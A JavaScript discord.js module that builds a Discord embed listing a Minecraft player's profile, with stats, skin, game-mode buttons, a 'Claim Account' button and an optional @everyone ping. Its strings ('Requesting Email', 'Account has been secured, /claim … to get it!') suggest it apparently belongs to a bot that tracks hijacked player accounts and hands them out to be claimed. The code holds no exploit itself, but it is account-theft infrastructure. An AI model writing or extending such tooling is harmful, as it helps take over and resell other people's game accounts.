const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const getStats = require('./getStats');
const { getSkinAttachment } = require('../imageHandler');

module.exports = async (name, settings = { sensored: false, list: 'skyblock', ping: '' }) => {
    console.log(`[LIST_PROFILE] Processing profile for ${settings.sensored ? 'HIDDEN' : name}`);
    const stats = await getStats(name);
    const skinAttachment = await getSkinAttachment(name, settings.sensored);
    
    // Function to hide username
    const hideText = (text) => {
        if (!settings.sensored || !text) return text;
        if (text.length <= 2) return '*'.repeat(text.length);
        return text[0] + '*'.repeat(text.length - 2) + text[text.length - 1];
    };

    const displayName = hideText(name);
    const status = settings.status || 'Requesting Email';
    
    const embed = {
        author: {
            name: `${settings.userId ? hideText(settings.userId) : 'Unknown'} | ${settings.discordId || 'Unknown ID'}`
        },
        title: `${displayName} | ${status} | Sent Alternative Button`,
        description: `\`\`\`Account has been secured, /claim ${displayName} to get it!\`\`\``,
        color: 2829617
    };

    // Only add thumbnail if skinAttachment is valid
    if (skinAttachment && skinAttachment.name) {
        embed.thumbnail = {
            url: 'attachment://' + skinAttachment.name
        };
    }

    const components = [
        new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('p_216102854258069609')
                .setLabel('Duels')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji({ id: '1295278858064498709' }),
            new ButtonBuilder()
                .setCustomId('p_216102860562108523')
                .setLabel('Skywars')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji({ id: '1418589836398297261' }),
            new ButtonBuilder()
                .setCustomId('p_216102867314937965')
                .setLabel('Skyblock')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji({ id: '1418590280390807704' }),
            new ButtonBuilder()
                .setCustomId('p_216102874709495919')
                .setLabel('Bedwars')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji({ id: '1416130064608657572' })
        ),
        new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('p_216105482849357945')
                .setLabel('Claim Account')
                .setStyle(ButtonStyle.Primary)
        )
    ];

    const msg = {
        embeds: [embed],
        components: components,
        ephemeral: true
    };

    // Only add files if skinAttachment is valid
    if (skinAttachment) {
        msg.files = [skinAttachment];
    }

    if (settings.ping) {
        msg.content = '@everyone';
    }

    return msg;
};